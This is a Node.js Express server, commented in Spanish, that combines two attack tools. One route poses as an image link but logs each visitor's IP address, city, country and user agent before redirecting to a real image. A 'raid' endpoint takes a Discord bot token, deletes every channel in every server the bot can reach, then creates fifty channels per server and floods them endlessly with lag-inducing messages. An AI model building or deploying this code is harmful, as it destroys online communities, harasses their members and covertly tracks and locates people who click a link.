const express = require('express');
const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

let ipLogs = []; 
const MY_WEB = "https://railway.app";

// --- LOGGER CON GEOLOCALIZACIÓN (CORREGIDO) ---
app.get('/image/:id.png', async (req, res) => {
    const targetImage = req.query.url || 'https://imgur.com';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    
    let geo = "Desconocido";
    try {
        // CORREGIDO: Faltaba la barra diagonal en la URL de ip-api.com
        const response = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`);
        if(response.data.status === 'success') {
            geo = `${response.data.city}, ${response.data.country} 🚩`;
        }
    } catch(e) {
        console.error("Error obteniendo geolocalización:", e.message);
    }

    ipLogs.unshift({
        ip: ip.split(',')[0],
        geo: geo,
        date: new Date().toLocaleTimeString(),
        ua: req.headers['user-agent'] || 'Desconocido'
    });

    if (ipLogs.length > 50) ipLogs.pop();
    res.redirect(targetImage);
});

app.get('/api/ip-logs', (req, res) => res.json(ipLogs));

// --- RAID BOT GLOBAL (MEJORADO CON MANEJO DE ERRORES) ---
app.post('/api/run-raid', async (req, res) => {
    const { token, msg, channelName } = req.body;
    
    // Validación básica
    if (!token) {
        return res.status(400).json({ error: "Token requerido" });
    }
    
    const bot = new Client({ 
        intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
    });

    try {
        await bot.login(token);
        
        bot.once('ready', async () => {
            console.log(`Bot conectado como ${bot.user.tag}`);
            
            bot.user.setPresence({ 
                activities: [{ 
                    name: `WEB: ${MY_WEB}`, 
                    type: ActivityType.Streaming, 
                    url: "https://twitch.tv" 
                }],
                status: 'online'
            });

            // CORREGIDO: Mejor manejo de promesas y evitar operaciones bloqueantes
            const guilds = bot.guilds.cache;
            const raidPromises = [];
            
            guilds.forEach((guild) => {
                raidPromises.push(processGuild(guild, msg, channelName));
            });

            try {
                await Promise.all(raidPromises);
                res.json({ success: true, count: guilds.size });
            } catch (error) {
                console.error("Error en raid:", error);
                res.status(500).json({ error: "Error durante el raid" });
            }
        });
    } catch (err) { 
        console.error("Error de login:", err.message);
        res.status(401).json({ error: "Token Inválido o error de conexión" }); 
    }
});

// Función auxiliar para procesar cada guild
async function processGuild(guild, msg, channelName) {
    try {
        const channels = await guild.channels.fetch();
        
        // Eliminar canales existentes con manejo de límites de rate
        const deletePromises = channels.map(ch => 
            ch.delete().catch(e => console.log(`No se pudo eliminar ${ch.name}: ${e.message}`))
        );
        await Promise.all(deletePromises);
        
        const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);
        
        // Crear nuevos canales de forma secuencial para evitar rate limiting
        for (let i = 0; i < 50; i++) {
            try {
                const ch = await guild.channels.create({ 
                    name: channelName || "raid-global", 
                    type: ChannelType.GuildText 
                });
                
                // Enviar mensajes iniciales
                for (let j = 0; j < 15; j++) {
                    await ch.send(lagMsg).catch(() => {});
                }
                
                // Configurar intervalo para mensajes continuos
                setInterval(() => ch.send(lagMsg).catch(() => {}), 250);
                
                // Pequeña pausa para evitar rate limiting
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (e) {
                console.log(`Error creando canal ${i}: ${e.message}`);
            }
        }
    } catch (e) {
        console.log(`Error procesando guild ${guild.name}: ${e.message}`);
    }
}

// PUERTO FORZADO A 8080
const PORT = 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Elite Engine operativo en http://0.0.0.0:${PORT}`);
});
